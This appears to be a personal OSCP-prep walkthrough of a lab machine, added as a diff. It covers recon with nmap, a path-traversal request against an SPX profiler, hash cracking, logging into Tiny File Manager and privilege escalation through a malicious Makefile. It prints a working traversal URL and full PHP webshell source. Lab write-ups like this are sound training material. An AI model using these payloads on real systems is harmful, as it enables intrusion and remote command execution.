@@ -1,0 +1,235 @@
+**Start 17:17 07-02-2025**
+
+---
+```
+Scope:
+192.168.192.108
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -vvvv -Pn -p- SPX -sT --min-rate=5000 -T5
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
+|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
+80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Tiny File Manager
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+![](../../../assets/7eac0b7ea0f1675b3816550764577514.png)
+
+I tried the default creds
+
+![](../../../assets/a338fe9ef2636785393cf2aa5606323c.png)
+
+To no avail.
+
+![](../../../assets/aa683d8df27b10c6f1bdd795c3b4098d.png)
+
+I tried to brute force it using `hydra` but it just gave me a bunch of false positives.
+
+![](../../../assets/1c0163d18beb58a5ce364aafc0b74df3.png)
+
+
+## Gobuster
+
+![](../../../assets/235376bd9c17230bcabc30cc52fe4668.png)
+
+![](../../../assets/e718c18a9412d85c55c95ea292673ccb.png)
+
+
+## 80/TCP - HTTP
+
+I started looking for exploits 
+
+![](../../../assets/888e50c7765fecf636d47b2f85493257.png)
+
+![](../../../assets/ce3d38fefbe90c6b73aab8d29e705fae.png)
+
+However this exploit didn't fit my case.
+
+Coming back to the `/phpinfo.php` endpoint however we find the following.
+
+![](../../../assets/87194a7176d6d97c028c026735590023.png)
+
+![](../../../assets/b318ff5c8a6c0bde55fbd5b54b30a54e.png)
+
+![](../../../assets/6dc0f9d3c8139b741c847103e9de8b37.png)
+
+>[!important]
+>The 3rd link in this case is the important one.
+
+![](../../../assets/f49550b9a7e61c84095d0d8d2a7df975.png)
+
+
+## PoC 
+
+If we try to run the exploit as is we'll get this error:
+
+![](../../../assets/690b552fad4039ffeabd032a9ec2e43e.png)
+
+However that is because we haven't modified the code yet.
+
+![](../../../assets/63dcd97c38fac0b6c732c99521f4006a.png)
+
+Here we notice the `SPX_KEY` value which we can gather from the `/phpinfo.php` page:
+
+![](../../../assets/0568596435169b74e01f9e7a48cbc639.png)
+
+Modified:
+
+![](../../../assets/751aee57333ee0a3b15e0d4c7f3733bb.png)
+
+Now when we run it:
+
+![](../../../assets/3655bca3a647ca502d971651f7e8b423.png)
+
+Awesome! 
+
+![](../../../assets/0a28c0273d837294a89ebf24d28487df.png)
+
+Not so awesome.
+
+Let's try it via the URL instead.
+
+```url
+http://spx/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php
+```
+
+![](../../../assets/33ca2eb9a793bd631b66d8d80790d08f.png)
+
+![](../../../assets/e3745a666b1dbd0f5d6ff1e9ef412253.png)
+
+We get 2 hashes that we can crack!
+
+![](../../../assets/639629ac2f21a585124dd5959d03cdf0.png)
+
+
+## Hashcat
+
+![](../../../assets/2d61f1a2575b83a14484f382fc43ff6f.png)
+
+>[!note]
+>This took a *long* time, but eventually two passwords were cracked: `profiler, lowprofile`.
+
+
+# Foothold
+
+Using `admin - lowprofile` I was able to log in.
+
+![](../../../assets/bf9f2a0280ce0dee1af9e69f14612284.png)
+
+I then uploaded this webshell
+
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+
+After which I could execute a rev shell:
+
+![](../../../assets/29158d4a64d87e32e55c2ca636c80570.png)
+
+>[!fail]
+>From here on my reverse shell for whatever reason wouldn't catch, whatever port I issued.
+
+The day after after a fresh reboot I tried again:
+
+![](../../../assets/79a6a5c55192a08381864def301c2ab7.png)
+
+This time it worked:
+
+![](../../../assets/72b1e21197374fe1277fdb256adffce9.png)
+
+![](../../../assets/5e415dcf5d10d91790de275a147f91d4.png)
+
+We don't have `sudo -l` privileges nor can we read the `local.txt` flag from *profiler*'s `/home` directory.
+
+Let's check linpeas.
+
+
+# Lateral Movement
+
+## LinPEAS
+
+Linpeas told me that this target is vulnerable to the **DirtyPipe** exploit:
+
+![](../../../assets/c3fb954a23198d22f1a9ee68109b6a2f.png)
+
+>[!fail]
+>![](../../../assets/b51bb7b57528352abf558f680fa48de7.png)
+
+Let's check further.
+
+>[!tip]
+>I forgot to spray the passwords and got stuck, try spraying first next time.
+
+![](../../../assets/c11564103c740960886475c68ba4f851.png)
+
+![](../../../assets/9a2c2ff6adede3116a9908b3306e1773.png)
+
+
+### local.txt
+
+![](../../../assets/ce58273d0b2dbf81fab042f4f183bb70.png)
+
+
+# Privilege Escalation
+
+## Replacing Makefile 
+
+We will have to create a malicious `Makefile` which we will use to escalate our privs to *root*.
+
+![](../../../assets/8d8c266b0ee5e3948e683b378842b73a.png)
+
+![](../../../assets/ed550cbef89d9198365a3e0b7a749c17.png)
+
+Let's run it.
+
+![](../../../assets/d7a6f2fa7791a5e5d27e08d61ee47b5b.png)
+
+![](../../../assets/0ec0f189c3635c5291dc3d319c4c32e9.png)
+
+We now notice that the `s` bit is set, meaning we can use `/bin/bash -p` now to get a `root` shell.
+
+![](../../../assets/a9bfcfebb40fc3cdd0ffcb0f900eda6e.png)
+
+
+### proof.txt
+
+![](../../../assets/7532c4814a10fd9269dcc18e22c3a3ce.png)
+
+>[!summary]
+>This box fucking *SUCKED*.
+
+---
+
+**Finished 10:47 08-02-2025**
+
+[^Links]:  [[OSCP Prep]]
